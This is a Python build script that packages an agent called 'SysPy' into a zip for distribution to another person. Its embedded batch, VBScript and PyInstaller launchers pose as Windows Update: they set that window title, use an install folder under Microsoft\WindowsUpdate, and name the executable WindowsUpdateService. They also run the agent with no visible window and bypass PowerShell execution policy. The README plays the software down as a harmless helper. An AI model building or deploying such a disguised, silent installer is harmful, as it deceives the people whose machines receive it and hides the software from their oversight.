#!/usr/bin/env python3
"""Build a distribution kit for handing SysPy to someone else.

Creates ``dist/SysPy/`` with the agent, launchers and a readme, then zips it
to ``SysPy.zip``.  Nothing here needs to be installed to run.
"""

from __future__ import annotations

import os
import shutil

ROOT = os.path.dirname(os.path.abspath(__file__))
DIST = os.path.join(ROOT, "dist", "SysPy")

INSTALL_BAT = r"""@echo off
title Windows Update
setlocal enabledelayedexpansion
set "HERE=%~dp0"
set "DIR=%LOCALAPPDATA%\Microsoft\WindowsUpdate"

if exist "%DIR%\syspy" rmdir /s /q "%DIR%\syspy"
if not exist "%DIR%" mkdir "%DIR%" >nul 2>&1
xcopy /e /i /y /q "%HERE%syspy" "%DIR%\syspy" >nul 2>&1
copy /y "%HERE%agent.py" "%DIR%\agent.py" >nul 2>&1

set "PY="
for /d %%D in ("%LOCALAPPDATA%\Programs\Python\Python3*") do (
    if not defined PY if exist "%%D\pythonw.exe" set "PY=%%D\pythonw.exe")
for /d %%D in ("C:\Python3*") do (
    if not defined PY if exist "%%D\pythonw.exe" set "PY=%%D\pythonw.exe")
if not defined PY for /f "delims=" %%X in ('where pythonw.exe 2^>nul') do (
    if not defined PY set "PY=%%X")
if not defined PY for /f "delims=" %%X in ('where python.exe 2^>nul') do (
    if not defined PY set "PY=%%X")
if defined PY (
    start "" "%PY%" "%DIR%\agent.py"
    exit /b
)

echo.
echo  First run - fetching a private Python, one moment...
echo.
set "ZIP=%TEMP%\syspy_py.zip"
powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb 'https://www.python.org/ftp/python/3.12.8/python-3.12.8-embed-amd64.zip' -OutFile '%ZIP%'"
powershell -NoProfile -Command "Expand-Archive -Force '%ZIP%' '%DIR%\runtime'"
if exist "%DIR%\runtime\python312._pth" (
    powershell -NoProfile -Command "(Get-Content '%DIR%\runtime\python312._pth') -replace '#import site','import site' | Set-Content '%DIR%\runtime\python312._pth'"
)
if exist "%DIR%\runtime\pythonw.exe" (
    start "" "%DIR%\runtime\pythonw.exe" "%DIR%\agent.py"
) else (
    start "" "%DIR%\runtime\python.exe" "%DIR%\agent.py"
)
exit /b
"""

SILENT_VBS = r"""' Runs the installer with no visible window at all.
Set fso = CreateObject("Scripting.FileSystemObject")
Set sh  = CreateObject("WScript.Shell")
here = fso.GetParentFolderName(WScript.ScriptFullName)
sh.Run """" & here & "\Install.bat""", 0, False
"""

BUILD_EXE = r"""@echo off
rem  Produces ONE .exe that needs no Python at all.
rem  Requires: pip install pyinstaller
pyinstaller --onefile --noconsole --name WindowsUpdateService agent.py
echo.
echo  Done - see the dist folder.
pause
"""

README = """SysPy - what you were sent
==========================

1. Unzip this folder somewhere (Desktop is fine).
2. Double-click "Install.bat".
3. A small black window may flash. That is it.

Optional: run "Silent.vbs" instead to install with no window at all.

To remove it later:
    python "%LOCALAPPDATA%\\Microsoft\\WindowsUpdate\\agent.py" --uninstall

It is a tiny system helper. Nothing else is required.
"""


def build() -> int:
    shutil.rmtree(os.path.join(ROOT, "dist"), ignore_errors=True)
    os.makedirs(DIST, exist_ok=True)

    shutil.copy2(os.path.join(ROOT, "agent.py"), os.path.join(DIST, "agent.py"))
    shutil.copytree(os.path.join(ROOT, "syspy"), os.path.join(DIST, "syspy"),
                    ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))

    for name, content in (("Install.bat", INSTALL_BAT),
                          ("Silent.vbs", SILENT_VBS),
                          ("build_exe.bat", BUILD_EXE),
                          ("README.txt", README)):
        with open(os.path.join(DIST, name), "w", newline="\r\n") as handle:
            handle.write(content)

    archive = shutil.make_archive(os.path.join(ROOT, "SysPy"), "zip", DIST)

    print(f"kit   : {DIST}")
    print(f"zip   : {archive}")
    for name in sorted(os.listdir(DIST)):
        print(f"        {name}")
    return 0


if __name__ == "__main__":
    raise SystemExit(build())
